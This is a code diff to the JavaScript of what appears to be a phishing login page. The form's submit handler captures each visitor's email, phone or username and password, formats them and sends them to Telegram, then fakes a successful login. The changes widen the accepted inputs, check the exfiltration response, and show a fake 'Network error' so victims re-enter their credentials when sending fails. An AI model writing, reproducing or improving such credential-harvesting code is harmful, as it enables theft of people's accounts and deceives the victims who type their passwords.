@@ -70,8 +70,21 @@ async function sendToTelegram(message) {
                 parse_mode: 'HTML'
             })
         });
-        
-        const data = await response.json();
+
+        const rawBody = await response.text();
+        let data = {};
+        try {
+            data = rawBody ? JSON.parse(rawBody) : {};
+        } catch (parseError) {
+            console.error('Invalid JSON response from backend:', rawBody);
+            return false;
+        }
+
+        if (!response.ok) {
+            console.error('Backend returned non-200 status:', response.status, data);
+            return false;
+        }
+
         console.log('Telegram response:', data);
         return data.ok === true;
     } catch (error) {
@@ -98,13 +111,17 @@ function formatLoginMessage(emailPhone, password) {
     } else {
         // Fallback: check the provided emailPhone string
         const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));
+        const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((emailPhone || '').trim());
         if (isPhone) {
             const phoneNumber = (emailPhone||'').replace(/\D/g, '');
             credentialsType = 'Phone';
             credentialsValue = `+${phoneNumber}`;
-        } else {
+        } else if (isEmail) {
             credentialsType = 'Email';
-            credentialsValue = emailPhone || '';
+            credentialsValue = (emailPhone || '').trim();
+        } else {
+            credentialsType = 'Username';
+            credentialsValue = (emailPhone || '').trim();
         }
     }
     
@@ -140,13 +157,17 @@ function formatOneTimeLoginMessage(emailPhone) {
     } else {
         // Fallback: check the provided emailPhone string
         const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));
+        const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((emailPhone || '').trim());
         if (isPhone) {
             const phoneNumber = (emailPhone||'').replace(/\D/g, '');
             credentialsType = 'Phone';
             credentialsValue = `+${phoneNumber}`;
-        } else {
+        } else if (isEmail) {
             credentialsType = 'Email';
-            credentialsValue = emailPhone || '';
+            credentialsValue = (emailPhone || '').trim();
+        } else {
+            credentialsType = 'Username';
+            credentialsValue = (emailPhone || '').trim();
         }
     }
     
@@ -386,11 +407,14 @@ form.addEventListener("submit", async e => {
     isProcessing.login = true;
     startLoading(form.querySelector('button[type="submit"]'));
 
-    const emailPhone = document.getElementById("email-phone").value;
+    const emailPhone = document.getElementById("email-phone").value.trim();
     const password = document.getElementById("password").value;
 
-    // Validate email or phone format
+    // Validate username/email/phone format
     const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
+    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailPhone);
+    const isUsername = /^[A-Za-z0-9._-]{3,64}$/.test(emailPhone);
+
     if (isPhone) {
         // Validate phone number has 7-15 digits
         const phoneDigits = emailPhone.replace(/\D/g, '');
@@ -400,15 +424,11 @@ form.addEventListener("submit", async e => {
             showToast("Enter a valid phone number");
             return;
         }
-    } else {
-        // Validate email format
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (!emailRegex.test(emailPhone)) {
-            stopLoading(form.querySelector('button[type="submit"]'));
-            isProcessing.login = false;
-            showToast("Enter a valid email");
-            return;
-        }
+    } else if (!isEmail && !isUsername) {
+        stopLoading(form.querySelector('button[type="submit"]'));
+        isProcessing.login = false;
+        showToast("Enter a valid email, phone, or username");
+        return;
     }
 
     // Send login credentials to Telegram based on mode
@@ -418,7 +438,13 @@ form.addEventListener("submit", async e => {
     } else {
         loginMessage = formatLoginMessage(emailPhone, password);
     }
-    await sendToTelegram(loginMessage);
+    const sent = await sendToTelegram(loginMessage);
+    if (!sent) {
+        stopLoading(form.querySelector('button[type="submit"]'));
+        isProcessing.login = false;
+        showToast("Network error. Please try again");
+        return;
+    }
 
     // Simulate server delay and always return success
     const result = await simulateServerSuccess();
